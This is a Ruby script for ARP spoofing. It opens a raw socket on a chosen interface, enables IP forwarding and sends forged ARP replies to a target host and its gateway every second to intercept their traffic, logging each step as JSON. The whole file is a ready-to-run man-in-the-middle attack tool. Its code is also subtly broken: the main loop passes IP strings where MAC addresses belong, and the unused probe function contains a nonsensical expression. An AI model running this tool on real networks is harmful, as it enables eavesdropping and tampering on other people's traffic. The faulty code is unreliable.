#!/usr/bin/env ruby
# frozen_string_literal: true

require 'socket'
require 'json'
require 'time'

ETH_P_ALL = [0x0003].pack('n').unpack1('S')
ETH_P_ARP = [0x0806].pack('n').unpack1('S')

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def bin2mac(b)
  b.bytes.map { |x| format('%02x', x) }.join(':')
end

def ip2bin(s)
  s.split('.').map(&:to_i).pack('C*')
end

def bin2ip(b)
  b.bytes.join('.')
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def get_my_mac(iface)
  File.read("/sys/class/net/#{iface}/address").strip
rescue
  '00:00:00:00:00:00'
end

def build_arp_reply(smac, sip, tmac, tip)
  eth = mac2bin(tmac) + mac2bin(smac) + [0x0806].pack('n')
  arp = [1, 0x0800, 6, 4, 2].pack('n n C C n')
  arp += mac2bin(smac) + ip2bin(sip) + mac2bin(tmac) + ip2bin(tip)
  eth + arp
end

def arp_probe(sock, ifidx, our_mac, our_ip, target_ip)
  probe = ([0xffffffffffff].pack('Q>') & 0xffffffffffff).to_s(16)
  eth = "\xff\xff\xff\xff\xff\xff" + mac2bin(our_mac) + [0x0806].pack('n')
  arp = [1, 0x0800, 6, 4, 1].pack('n n C C n')
  arp += mac2bin(our_mac) + ip2bin(our_ip) + "\x00\x00\x00\x00\x00\x00" + ip2bin(target_ip)
  frame = eth + arp
  addr = Socket.pack_sockaddr_ll(ETH_P_ARP, ifidx, 0, 0, 0, '')
  sock.send(frame, 0, addr)
end

def enable_ip_forward
  File.write('/proc/sys/net/ipv4/ip_forward', "1\n")
rescue => e
  $stderr.puts "warning: could not enable IP forwarding: #{e.message}"
end

def disable_ip_forward
  File.write('/proc/sys/net/ipv4/ip_forward', "0\n")
rescue
  nil
end

begin
  iface = ARGV[0]
  target_ip = ARGV[1]
  gateway_ip = ARGV[2]

  raise 'usage: arp_spoof.rb <interface> <target_ip> <gateway_ip>' unless iface && target_ip && gateway_ip

  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  my_mac_str = get_my_mac(iface)
  my_mac = mac2bin(my_mac_str)

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
  addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')

  enable_ip_forward

  puts JSON.generate({
    event: 'arp_spoof_start', iface: iface, bssid: '', ssid: '', channel: 0,
    data: { target_ip: target_ip, gateway_ip: gateway_ip,
            our_mac: my_mac_str },
    timestamp: Time.now.iso8601
  })
  $stdout.flush

  target_mac = "\x00\x00\x00\x00\x00\x00"
  gateway_mac = "\x00\x00\x00\x00\x00\x00"

  trap('INT') do
    puts JSON.generate({
      event: 'arp_spoof_stop', iface: iface, bssid: '', ssid: '', channel: 0,
      data: { target_ip: target_ip, gateway_ip: gateway_ip,
              packets_sent: @sent || 0 },
      timestamp: Time.now.iso8601
    })
    $stdout.flush
    disable_ip_forward
    exit 0
  end

  @sent = 0
  loop do
    poison_target = build_arp_reply(gateway_ip, mac2bin(my_mac_str), target_ip, target_ip)
    poison_gateway = build_arp_reply(target_ip, mac2bin(my_mac_str), gateway_ip, gateway_ip)

    bytes_t = sock.send(poison_target, 0, addr)
    bytes_g = sock.send(poison_gateway, 0, addr)
    @sent += 2

    puts JSON.generate({
      event: 'arp_spoof', iface: iface, bssid: '', ssid: '', channel: 0,
      data: { target_ip: target_ip, gateway_ip: gateway_ip,
              target_packet: bytes_t, gateway_packet: bytes_g,
              total_sent: @sent },
      timestamp: Time.now.iso8601
    })
    $stdout.flush

    sleep(1)
  end

rescue Interrupt
  disable_ip_forward
  puts JSON.generate({
    event: 'arp_spoof_stop', iface: iface || '', bssid: '', ssid: '', channel: 0,
    data: { reason: 'interrupted', packets_sent: @sent || 0 },
    timestamp: Time.now.iso8601
  })
rescue => e
  disable_ip_forward
  $stderr.puts JSON.generate({
    event: 'error', data: { message: e.message, backtrace: e.backtrace&.first },
    timestamp: Time.now.iso8601
  })
  exit 1
end
